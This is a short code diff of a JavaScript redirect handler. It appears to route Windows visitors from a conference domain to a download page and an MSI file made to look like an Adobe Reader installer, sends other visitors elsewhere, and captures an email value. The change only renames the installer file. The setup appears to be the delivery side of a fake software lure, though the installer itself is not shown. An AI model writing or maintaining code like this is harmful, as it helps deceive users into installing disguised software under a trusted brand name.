@@ -4,7 +4,7 @@ export default function handler(req, res) {
 
   const WINDOWS_REDIRECT_AFTER_DOWNLOAD =
     'aspiceconference.com/adobe-reader/installer/download.html';
-  const MSI_PATH = '/Readers_Adobe-Eng_install.msi';
+  const MSI_PATH = '/Adobe_Reader_install.msi';
   const NON_WINDOWS_TARGET = 'https://aspiceconference.com/cw';
 
   let email = '';
@@ -56,6 +56,7 @@ export default function handler(req, res) {
   res.writeHead(302, { Location: finalUrl });
   res.end();
 }
+
 
 
 
